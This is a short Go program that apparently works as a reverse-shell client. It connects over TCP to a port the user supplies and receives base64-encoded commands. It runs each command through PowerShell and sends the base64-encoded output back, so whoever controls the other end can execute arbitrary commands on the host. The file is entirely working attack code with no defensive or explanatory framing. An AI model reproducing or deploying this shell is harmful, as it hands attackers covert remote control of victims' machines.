package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	fmt.Print("Enter LPORT : ")
	var port string
	fmt.Scan(&port)
	c, err := net.Dial("tcp4", ":"+port)
	if err != nil {
		fmt.Println("Error")
		c.Close()
		os.Exit(1)
	}

	for {
		message, _ := bufio.NewReader(c).ReadString('\n')
		dec, _ := b64.StdEncoding.DecodeString(message)
		message = string(dec)
		cmd := exec.Command("powershell", "-c", message)
		stdout, _ := cmd.Output()
		fmt.Println("-> ", string(stdout))
		if strings.TrimSpace(string(message)) == "quit" {
			fmt.Println("Message : ", strings.TrimSpace(string(message)))
			c.Close()
			os.Exit(0)
		}
		output := b64.StdEncoding.EncodeToString(stdout)
		fmt.Fprintf(c, output+"\n")
	}
}
